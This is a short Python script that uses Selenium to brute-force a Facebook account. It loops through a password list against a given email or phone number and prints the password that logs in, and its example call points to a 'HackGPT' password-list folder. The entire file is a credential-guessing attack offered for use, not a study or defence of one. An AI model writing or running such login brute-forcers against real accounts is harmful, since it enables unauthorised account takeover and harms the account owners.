from selenium import webdriver
from selenium.webdriver.common.by import By
import time

def login_to_facebook(email, password_file):
    driver_path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome"

    driver = webdriver.Chrome(driver_path)

    driver.get("https://www.facebook.com")

    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        email_input = driver.find_element(By.NAME, "email")
        email_input.clear()
        email_input.send_keys(email)

        password_input = driver.find_element(By.NAME, "pass")
        password_input.clear()
        password_input.send_keys(password)

        password_input.submit()

        time.sleep(7)

        if driver.current_url == "https://www.facebook.com/":
            print("Login successful with password:", password)
            break
        else:
            print("Login failed with password:", password)
            driver.get("https://www.facebook.com")

    driver.quit()

# Example usage:
login_to_facebook("Phone_Number", "C:\\Users\\HannibalXVII\\Desktop\\HackGPT\\Facebook\\Password_List.txt")


